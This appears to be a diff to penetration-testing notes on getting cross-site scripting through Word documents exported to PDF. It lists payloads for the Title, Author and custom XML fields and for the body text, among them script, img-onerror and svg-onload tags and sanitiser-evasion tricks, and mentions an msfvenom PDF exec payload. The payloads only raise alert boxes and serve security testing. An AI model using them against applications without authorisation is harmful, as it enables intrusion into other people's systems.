@@ -85,3 +85,65 @@ metasploit's PDF toolkit: msfvenom -p windows/x64/exec -f pdf
 
 pdfid.py, pdf-parser.py — for inspecting and modifying embedded JS
 
+
+
+
+1. Metadata Payload (Word → PDF)
+In Word:
+
+File → Info → Properties → "Title"
+
+Use this as the title:
+
+html
+Copy
+Edit
+"><script>alert('XSS')</script>
+Same for:
+
+Author
+
+Subject
+
+Tags
+
+✅ These fields often get injected into the HTML when the app shows “PDF details” — perfect for reflected XSS testing.
+
+2. Visible Content Injection
+In Word, type this in the document body:
+
+html
+Copy
+Edit
+<script>alert('XSS')</script>
+Or a sneaky version:
+
+html
+Copy
+Edit
+<img src=x onerror=alert('PDF-XSS')>
+Format it in large, bold, or header styles to increase chances it’s picked up.
+
+3. Use of Unicode/Obfuscation
+Some apps attempt to sanitize <script> but fail on encoding tricks:
+
+html
+Copy
+Edit
+<script>alert`1`</script>
+Or try breaking tags up:
+
+html
+Copy
+Edit
+<scr<script>ipt>alert(1)</script>
+4. Inject into Custom Fields (for advanced testing)
+Word → Developer Tab → Document Panel or Custom XML Parts
+
+Insert:
+
+html
+Copy
+Edit
+"><svg/onload=alert(1)>
+Then save → export to PDF.
